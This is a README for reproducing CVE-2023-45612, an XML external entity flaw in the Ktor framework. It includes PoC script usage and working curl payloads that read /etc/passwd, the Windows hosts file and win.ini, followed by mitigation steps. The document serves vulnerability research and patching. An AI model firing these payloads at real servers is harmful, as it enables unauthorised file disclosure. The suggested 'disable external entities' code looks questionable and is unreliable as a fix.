# CVE-2023-45612 XXE Vulnerability Reproduction

This document provides a complete reproduction guide for the XML External Entity (XXE) vulnerability in Ktor framework versions prior to 2.3.5.

## Vulnerability Details

- **CVE ID**: CVE-2023-45612
- **Affected Versions**: Ktor < 2.3.5
- **Current Project Version**: 2.2.4 (Vulnerable)
- **Vulnerability Type**: XML External Entity (XXE) Injection
- **CVSS Score**: High

## Vulnerability Description

The vulnerability exists in the `xmlutil` library version 0.86.1 used by Ktor for XML processing. According to the [official Ktor fix](https://github.com/ktorio/ktor/pull/3770), the issue was in xmlutil's XML parser that allows external entity references, which can be exploited to:

1. Read local files from the server
2. Perform Server-Side Request Forgery (SSRF) attacks  
3. Cause Denial of Service (DoS)
4. In some cases, achieve Remote Code Execution

## Project Setup

### 1. Verify Vulnerable Version

Check `gradle/libs.versions.toml`:
```toml
[versions]
ktor = "2.2.4"  # Vulnerable version
```

### 2. Modified Application

The application has been modified to include XML processing capabilities:

- Added XML content negotiation support
- Created `/xml` endpoint for structured XML processing
- Created `/xml-raw` endpoint for raw XML processing

### 3. Dependencies Added

```kotlin
implementation(libs.ktor.server.content.negotiation)
implementation(libs.xmlutil.core)           // Vulnerable xmlutil 0.86.1
implementation(libs.xmlutil.serialization)  // Vulnerable xmlutil 0.86.1
```

The key vulnerability is in `xmlutil` version 0.86.1, which was fixed in version 0.86.2 as shown in the [official Ktor pull request](https://github.com/ktorio/ktor/pull/3770).

## Reproduction Steps

### Step 1: Start the Vulnerable Server

```bash
# Build and run the Ktor application
./gradlew run

# Or run in background
./gradlew run &

# Verify server is running
curl http://localhost:8080/
```

### Step 2: Install Python Dependencies

```bash
pip install -r requirements.txt
```

### Step 3: Test Server Connectivity

```bash
python test_server.py
```

### Step 4: Run XXE Exploitation

#### Basic XXE Test
```bash
# Test file read via XXE
python xxe_poc.py

# Test specific file
python xxe_poc.py --file /etc/hosts

# Test Windows files (if running on Windows)
python xxe_poc.py --file "C:\\Windows\\System32\\drivers\\etc\\hosts"
```

#### Comprehensive Test
```bash
# Run full vulnerability assessment
python xxe_poc.py --full-test
```

#### Custom Target
```bash
# Test remote server
python xxe_poc.py --url http://target-server:8080 --full-test
```

#### Windows-Specific Testing

For Windows systems, use the dedicated Windows PoC script:

```bash
# Run Windows-specific XXE test
python xxe_poc_windows.py --full-test

# Test specific Windows file
python xxe_poc_windows.py --file "C:/Windows/win.ini"

# Test Windows hosts file
python xxe_poc_windows.py --file "C:/Windows/System32/drivers/etc/hosts"
```

## Expected Results

### Successful Exploitation

If the vulnerability is present, you should see:

**Linux/Unix systems:**
```
[+] SUCCESS! File content leaked via XXE
[*] Response Body:
Received XML content: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**Windows systems:**
```
[+] SUCCESS! Windows file content leaked via XXE
[*] Response Body:
Received XML content: # Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
127.0.0.1       localhost
::1             localhost
```

Or for Windows INI files:
```
[+] SUCCESS! Windows file content leaked via XXE
[*] Response Body:
Received XML content: [fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

### Vulnerable Endpoints

1. **`/xml-raw`** - Processes raw XML and reflects content
2. **`/xml`** - Deserializes XML into structured data

## Manual Testing

### Test Payload 1: Basic File Read

```bash
curl -X POST http://localhost:8080/xml-raw \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'
```

### Test Payload 2: Structured Data

```bash
curl -X POST http://localhost:8080/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE UserData [
<!ELEMENT UserData ANY>
<!ELEMENT name ANY>
<!ELEMENT email ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<UserData>
    <name>&xxe;</name>
    <email>test@example.com</email>
</UserData>'
```

### Test Payload 3: Windows Files

```bash
# Windows hosts file
curl -X POST http://localhost:8080/xml-raw \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root>&xxe;</root>'

# Windows INI file
curl -X POST http://localhost:8080/xml-raw \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ELEMENT root ANY>
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<root>&xxe;</root>'
```

## Mitigation

### Upgrade xmlutil Version

The correct fix is to update the `xmlutil` library version in `gradle/libs.versions.toml`:
```toml
[versions]
xmlutil = "0.86.2"  # Fixed version (was 0.86.1)
```

Or upgrade to Ktor 2.3.5+ which includes the fixed xmlutil version:
```toml
[versions]
ktor = "2.3.5"  # Includes fixed xmlutil
```

### Alternative: Disable External Entities

If upgrading is not possible, configure the XML parser to disable external entities:

```kotlin
install(ContentNegotiation) {
    xml {
        // Disable external entities
        xmlDeclHandler = null
        xmlDefaultHandler = null
    }
}
```

## Security Impact

This vulnerability allows attackers to:

1. **Information Disclosure**: Read sensitive files from the server
2. **SSRF**: Make requests to internal services
3. **DoS**: Cause resource exhaustion with billion laughs attacks
4. **RCE**: In rare cases, achieve code execution

## Files Created for Reproduction

- `xxe_poc.py` - Main exploitation script
- `xxe_poc_windows.py` - Windows-specific exploitation script  
- `test_server.py` - Server connectivity test
- `requirements.txt` - Python dependencies
- `run_xxe_test.bat` - Automated Windows test runner
- Modified Kotlin source files with vulnerable xmlutil 0.86.1

## Testing Checklist

- [ ] Server starts successfully on port 8080
- [ ] Basic connectivity test passes
- [ ] XXE payload successfully reads `/etc/passwd`
- [ ] Structured XML endpoint is vulnerable
- [ ] Multiple file types can be read
- [ ] Error messages don't leak sensitive information

## Responsible Disclosure

This reproduction is for educational and security testing purposes only. Always:

1. Test only on systems you own or have explicit permission to test
2. Do not test on production systems
3. Report vulnerabilities responsibly
4. Follow ethical hacking guidelines

## References

- [CVE-2023-45612 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-45612)
- [Ktor Security Advisory](https://github.com/ktorio/ktor/security/advisories)
- [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
